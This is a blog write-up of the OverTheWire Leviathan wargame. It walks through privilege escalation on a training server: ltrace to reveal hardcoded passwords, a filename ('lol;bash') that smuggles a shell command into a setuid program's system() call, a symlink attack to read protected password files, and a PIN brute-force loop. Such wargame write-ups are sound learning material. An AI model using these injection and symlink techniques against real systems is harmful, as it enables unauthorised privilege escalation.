---
layout: post
title:  OverTheWire Leviathan Write-Up
excerpt: "Write-up for OverTheWire Leviathan"
categories: overthewire wargames write-up

---

## Level 0

SSH into the server using the creds given. ```ls -a``` will show you a hidden directory, in it a ```bookmarks.html``` file. Cat and grep password to find the password.

## Level 1

In this level, you find a setuid binary ```check``` that checks a password and then does something. No help for usage. I ran ```strings``` but couldn't find much. I then ran ```ltrace```, and found it compared my input to a password ```sex```... kinky xD

So I entered that password and got a shell, ```whoami``` -> ```leviathan2```. Just do:
```bash
cat /etc/leviathan_pass/leviathan2
```

## Level 2

This one had a setuid binary that printed files for us, as ```leviathan3```. So, believing the program's prompt, I tried printing the password:
```bash
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```
:neutral_face:

Ran ```ltrace``` on it:
```bash
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4) = -1
puts("You cant have that file..."You cant have that file...
)  = 27
+++ exited (status 1) +++
```

Ran ```ltrace``` with ```/etc/passwd``` as input to ```printfile```
```bash
access("/etc/passwd", 4)            = 0
snprintf("/bin/cat /etc/passwd", 511, "/bin/cat %s", "/etc/passwd") = 20
geteuid()                           = 12002
geteuid()                           = 12002
setreuid(12002, 12002)              = 0
system("/bin/cat /etc/passwd"root:x:0:0:root:/root:/bin/bash
```

So, it checks for access rights, then passed the filename as a string to ```system(/bin/cat %s)```. So, if we name the file into an interesting bash command, we can execute it. Made a file ```lol;bash``` and passed it to the setuid binary and I got a shell as ```leviathan3```. Then just cat the password.
```bash
leviathan2@leviathan:~$ ./printfile /tmp/l3dr3/lol\;bash
/bin/cat: /tmp/l3dr3/lol: No such file or directory
leviathan3@leviathan:~$ cat /etc/leviathan_pass/leviathan3
<password_here>
```

## Level 3

This one was identical to Level 1, there was a setuid binary that gave us a shell when the correct password was entered. 
```bash
leviathan3@leviathan:~$ ltrace ./level3
__libc_start_main(0x8048618, 1, 0xffffd794, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")          = -1
printf("Enter the password> ")      = 20
fgets(Enter the password> a
"a\n", 256, 0xf7fc55a0)       = 0xffffd5a0
strcmp("a\n", "snlprintf\n")        = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)          = 19
+++ exited (status 0) +++
```

Just enter the correct input (```snlprintf```) and you get the password.

## Level 4

In this level, we had a hidden folder ```trash``` that contained a setuid binary that gave us binary output. Converted it to ASCII, and that was the password for the next level.

ltrace:
```bash
leviathan4@leviathan:~/.trash$ ltrace ./bin
__libc_start_main(0x80484bb, 1, 0xffffd774, 0x80485b0 <unfinished ...>
fopen("/etc/leviathan_pass/leviathan5", "r") = 0
+++ exited (status 255) +++
```

## Level 5

In this level, the setuid binary read a file ```/tmp/file.log``` and outputted its contents. I just entered ```cat /etc/leviathan_pass/leviathan6``` to that file, but i got back ```cat /etc/leviathan_pass/leviathan6``` as the output. No command injection. I ran ltrace on it and found the reason... it read the file letter by letter, then outputted each letter. So, I resorted to another method, creating a symbolic link:
```bash
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
<password_here>
```

This basically "links" the ```/tmp/file.log``` to ```/etc/leviathan_pass/leviathan6```, so when the setuid binary is run, it tries to open ```/tmp/file.log```, but since it is "linked" to ```/etc/leviathan_pass/leviathan6```, it opens and outputs the contents of the password file, revealing the password to us.

Sweet!
:smile:

## Level 6

Had to brute force a 4-digit pin in this one. Similar to Natas - Level 24. Just run:
```bash
for i in $(seq 0000 9999);do ./leviathan6 $i; done
```
and wait for a few seconds. You will eventually get a shell as user ```leviathan7```. You know what to do now...

## Level 7

End of the game, there is a file ```CONGRATULATIONS``` which says:
```
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
```

I am going to ignore the big sentence in the brackets xD... Nice and short wargame, onto the next one.



